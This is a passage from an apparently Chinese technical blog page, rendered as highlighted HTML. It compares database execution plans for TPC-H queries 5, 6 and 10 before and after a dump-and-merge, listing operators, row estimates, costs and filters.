  <span class="operator">|</span><span class="number">36737</span>    <span class="operator">|</span><span class="number">6948838</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>    <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">42</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">36737</span>    <span class="operator">|</span><span class="number">6914905</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>supplier<span class="operator">|</span><span class="number">10000</span>    <span class="operator">|</span><span class="number">3973</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     HASH <span class="keyword">JOIN</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">907292</span>   <span class="operator">|</span><span class="number">6522128</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      HASH <span class="keyword">JOIN</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">223710</span>   <span class="operator">|</span><span class="number">1232531</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">62265</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>orders  <span class="operator">|</span><span class="number">228275</span>   <span class="operator">|</span><span class="number">770751</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2361773</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([nation.n_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount), <span class="keyword">DESC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([nation.n_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([nation.n_name]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([nation.n_name], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([nation.n_regionkey <span class="operator">=</span> region.r_regionkey]), other_conds(nil)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([region.r_regionkey]), <span class="keyword">filter</span>([region.r_name <span class="operator">=</span> <span class="string">&#x27;EUROPE&#x27;</span>]),</span><br><span class="line">      access([region.r_regionkey], [region.r_name]), partitions(p0)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([nation.n_name], [lineitem.l_extendedprice], [lineitem.l_discount], [nation.n_regionkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([supplier.s_nationkey <span class="operator">=</span> nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_suppkey <span class="operator">=</span> supplier.s_suppkey], [customer.c_nationkey <span class="operator">=</span> supplier.s_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([supplier.s_suppkey], [supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([supplier.s_suppkey], [supplier.s_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_suppkey], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_orderkey <span class="operator">=</span> orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([customer.c_nationkey], [orders.o_orderkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_custkey <span class="operator">=</span> orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([orders.o_orderDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [orders.o_orderDATE <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice], [lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.025</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-6-执行计划">SQL-6 执行计划</h3>
<p>SQL-6 的特点是带有聚集操作的单表查询操作。<br>
查询语句使用了BETWEEN-AND操作符（<code>l_discount between 0.02 - 0.01 and 0.02 + 0.01</code>），有的数据库可以对BETWEEN-AND进行优化。</p>
<ul>
<li>一般情况下的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR       <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">7123834</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">1501</span>     <span class="operator">|</span><span class="number">7123548</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount]), <span class="keyword">filter</span>([(T_OP_BTW, lineitem.l_discount, ?, ?)], [lineitem.l_shipDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [lineitem.l_shipDATE <span class="operator">&lt;</span> ?], [lineitem.l_quantity <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_discount], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.005</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>转储合并后的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR       <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">5400125</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">123843</span>   <span class="operator">|</span><span class="number">5376470</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount]), <span class="keyword">filter</span>([(T_OP_BTW, lineitem.l_discount, ?, ?)], [lineitem.l_shipDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [lineitem.l_quantity <span class="operator">&lt;</span> ?], [lineitem.l_shipDATE <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_discount], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="SQL-10-执行计划">SQL-10 执行计划</h3>
<p>SQL-10 语句是查询每个国家在某时刻起的三个月内货运存在问题的客户和造成的损失。<br>
该语句特点是： 带有分组、排序、聚集操作并存的多表连接查询操作。</p>
<ul>
<li>一般情况下的执行计划：</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR            <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST    <span class="operator">|</span></span><br><span class="line"><span class="comment">-----------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>LIMIT               <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">35520428</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> TOP<span class="operator">-</span>N SORT         <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">35520426</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>     <span class="operator">|</span>        <span class="operator">|</span><span class="number">3566213</span>  <span class="operator">|</span><span class="number">19341150</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>        <span class="operator">|</span>        <span class="operator">|</span><span class="number">3566213</span>  <span class="operator">|</span><span class="number">14185253</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    SUBPLAN SCAN    <span class="operator">|</span>VIEW3   <span class="operator">|</span><span class="number">101</span>      <span class="operator">|</span><span class="number">6942367</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">101</span>      <span class="operator">|</span><span class="number">6942354</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">59413</span>    <span class="operator">|</span><span class="number">6919631</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>       <span class="operator">|</span>        <span class="operator">|</span><span class="number">3638622</span>  <span class="operator">|</span><span class="number">3933285</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>     SUBPLAN SCAN   <span class="operator">|</span>VIEW2   <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">1326865</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>      HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">10001</span>    <span class="operator">|</span><span class="number">1325485</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">10</span><span class="operator">|</span>       <span class="keyword">TABLE</span> SCAN   <span class="operator">|</span>orders  <span class="operator">|</span><span class="number">166667</span>   <span class="operator">|</span><span class="number">1245098</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">11</span><span class="operator">|</span>     HASH <span class="keyword">JOIN</span>      <span class="operator">|</span>        <span class="operator">|</span><span class="number">37125</span>    <span class="operator">|</span><span class="number">421603</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">12</span><span class="operator">|</span>      SUBPLAN SCAN  <span class="operator">|</span>VIEW4   <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">74</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">13</span><span class="operator">|</span>       HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">70</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">14</span><span class="operator">|</span>        <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">41</span>      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">15</span><span class="operator">|</span>      SUBPLAN SCAN  <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">350228</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">16</span><span class="operator">|</span>       HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">329525</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">17</span><span class="operator">|</span>        <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">112660</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment]), <span class="keyword">filter</span>(nil), limit(<span class="number">20</span>), <span class="keyword">offset</span>(nil)</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>)))], [VIEW1.customer.c_acctbal], [VIEW4.nation.n_name], [VIEW1.customer.c_address], [VIEW1.customer.c_phone], [VIEW1.customer.c_comment]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span class="operator">*</span> VIEW2.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">40</span>, <span class="number">0</span>)) <span class="operator">*</span> VIEW3.T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount) <span class="operator">*</span> <span class="built_in">cast</span>(VIEW4.T_FUN_COUNT(<span class="operator">*</span>), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))), <span class="keyword">DESC</span>]), topn(<span class="number">20</span>)</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([VIEW1.customer.c_custkey], [VIEW1.customer.c_name], [T_FUN_SUM(<span class="built_in">cast</span>(VIEW1.T_FUN_COUNT(<span class="operator">*</span>) <span 